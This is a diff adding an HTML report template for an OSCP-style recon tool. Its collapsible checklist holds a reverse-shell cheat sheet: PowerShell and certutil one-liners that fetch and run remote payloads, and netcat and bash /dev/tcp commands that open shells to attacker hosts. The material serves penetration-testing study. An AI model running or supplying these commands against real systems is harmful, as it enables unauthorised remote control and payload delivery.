@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>Report Auto-Recon OSCP by HaoNH</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="{{{base_path}}}/jsmind/js/jsmind.js"></script>
+
+  <link type="text/css" rel="stylesheet" href="{{{base_path}}}/jsmind/style/jsmind.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <style type="text/css">
+    .jsmind_container {
+      width: auto;
+      height: 500px;
+      border: solid 1px #ccc;
+      /*background:#f4f4f4;*/
+      background: #f4f4f4;
+    }
+  </style>
+
+</head>
+
+<body>
+  <div class="jumbotron text-center">
+    <h1>OSCP-AUTO-RECON</h1>
+    <p>Report For 10.10.10.10</p>
+    <p>Check List Need To Do</p>
+    <nav class="navbar navbar-expand-lg navbar-light bg-light navbar-ligh">
+      <a class="navbar-brand" href="index.html">OSCP-Auto_Recon</a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav">
+          <li class="nav-item active">
+            <a class="nav-link" href="index.html">Scans <span class="sr-only">(current)</span></a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="checklist.html">Check-list</a>
+          </li>
+        </ul>
+      </div>
+    </nav>
+  </div>
+
+  <div class="container">
+
+    <div id="accordion">
+      <div class="card">
+        <div class="card-header" id="headingOne">
+          <h5 class="mb-0">
+            <button class="btn btn-link" data-toggle="collapse" data-target="#abcd" aria-expanded="true"
+              aria-controls="collapseOne">
+              Genaral Checklist + Command
+            </button>
+          </h5>
+        </div>
+
+        <div id="abcd" class="collapse" aria-labelledby="headingOne" data-parent="#accordion">
+          <div class="card-body">
+            <div id="accordion-genaral">
+              <div class="card">
+                <div class="card-header" id="headingOne">
+                  <h5 class="mb-0">
+                    <button class="btn btn-link" data-toggle="collapse" data-target="#reverse-shell"
+                      aria-expanded="true" aria-controls="collapseOne">
+                      Reverse Shells
+                    </button>
+                  </h5>
+                </div>
+
+                <div id="reverse-shell" class="collapse" aria-labelledby="headingOne" data-parent="#accordion-genaral">
+
+                  <div class="card">
+                    <div class="card-header" id="headingOne">
+                      <h5 class="mb-0">
+                        <button class="btn btn-link" data-toggle="collapse" data-target="#reverse-shell-windows"
+                          aria-expanded="true" aria-controls="collapseOne">
+                          Windows Reverse Shells
+                        </button>
+                      </h5>
+                    </div>
+
+                    <div id="reverse-shell-windows" class="collapse" aria-labelledby="headingOne"
+                      data-parent="#reverse-shell">
+                      <div class="card-body">
+                        <h4>Command</h4>
+                        <code>
+                                                    <ul>
+                                                        <li>powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')</li>
+                                                        <li>certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe</li>
+                                                        <li>certutil.exe -urlcache -f http://192.168.1.109/nc.exe nc.exe</li>
+                                                        <li>nc.exe -e cmd.exe <Attacker_IP> <PORT></li>
+                                                    </ul>
+                                                </code>
+                        <h4>Refer</h4>
+                        <ul>
+
+                          <li><a href="https://blog.adithyanak.com/oscp-preparation-guide/windows-reverse-shells"
+                              target="_blank">https://blog.adithyanak.com/oscp-preparation-guide/windows-reverse-shells</a>
+                          </li>
+                          <li><a
+                              href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
+                              target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a>
+                          </li>
+                        </ul>
+                      </div>
+
+                    </div>
+
+                  </div>
+
+                  <div class="card">
+                    <div class="card-header" id="headingOne">
+                      <h5 class="mb-0">
+                        <button class="btn btn-link" data-toggle="collapse" data-target="#reverse-shell-linux"
+                          aria-expanded="true" aria-controls="collapseOne">
+                          Linux Reverse Shells
+                        </button>
+                      </h5>
+                    </div>
+
+                    <div id="reverse-shell-linux" class="collapse" aria-labelledby="headingOne"
+                      data-parent="#reverse-shell">
+                      <div class="card-body">
+                        <h4>Command</h4>
+                        <code>
+                                                    <ul>
+                                                        <li>bash -i >& /dev/tcp/LHOST/LPORT 0>&1</li>
+                                                        <li>nc -e /bin/sh 10.0.0.1 4242</li>
+                                                        <li>nc -e /bin/bash 10.0.0.1 4242</li>
+                                                        <li>nc -c bash 10.0.0.1 4242</li>
+                                                    </ul>
+                                                </code>
+                        <h4>Refer</h4>
+                        <ul>
+
+                          <li><a
+                              href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
+                              target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a>
+                          </li>
+                          <li><a href="https://blog.adithyanak.com/oscp-preparation-guide/linux-reverse-shells"
+                              target="_blank">https://blog.adithyanak.com/oscp-preparation-guide/linux-reverse-shells</a>
+                          </li>
+                          <li><a href="https://fareedfauzi.gitbook.io/oscp-notes/reverse-shell/linux-reverse-shell"
+                              target="_blank">https://fareedfauzi.gitbook.io/oscp-notes/reverse-shell/linux-reverse-shell</a>
+                          </li>
+                        </ul>
+                      </div>
+                    </div>
+
+                  </div>
+
+
+                </div>
+
+              </div> <!-- End block nmap -->
+
+              <div class="card">
+                <div class="card-header" id="headingOne">
+                  <h5 class="mb-0">
+                    <button class="btn btn-link" data-toggle="collapse" data-target="#refer-page" aria-expanded="true"
+                      aria-controls="collapseOne">
+                      Refer pages
+                    </button>
+                  </h5>
+                </div>
+
+                <div id="refer-page" class="collapse" aria-labelledby="headingOne" data-parent="#accordion-genaral">
+
+                  <ul>
+
+                    <li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html"
+                        target="_blank">https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html</a>
+                    </li>
+                    <li><a href="https://book.hacktricks.xyz/pentesting/pentesting-network"
+                        target="_blank">https://book.hacktricks.xyz/pentesting/pentesting-network</a></li>
+                    <li><a href="https://blog.adithyanak.com/oscp-preparation-guide"
+                        target="_blank">https://blog.adithyanak.com/oscp-preparation-guide</a></li>
+                    <li><a
+                        href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources"
+                        target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources</a>
+                    </li>
+                    <li><a href="https://www.xmind.net/m/QsNUEz/" target="_blank">Mind Map OSCP</a></li>
+                    <li><a href="https://gtfobins.github.io/" target="_blank">Bypass local security</a></li>
+                    <li><a href="file:///Users/haonh6/OSCP/OSCP_Notes_1617098763.pdf" target="_blank">OSCP NOTES
+                        BOOKS</a></li>
+                  </ul>
+
+
+                </div>
+
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      {{{data_block}}}
+    </div>
+
+  </div>
+  ​
+  <!-- Footer -->
+  <footer class="page-footer font-small blue pt-4">
+
+    <!-- Footer Links -->
+    <div class="container-fluid text-center jumbotron">
+
+      <p>Develop by HaoNH</p>
+
+    </div>
+    <!-- Footer Links -->
+
+  </footer>
+  <!-- Footer -->
+
+  <script type="text/javascript">
+
+    {{{data_js}}}
+  </script>
+
+</body>
+
+</html>
+​
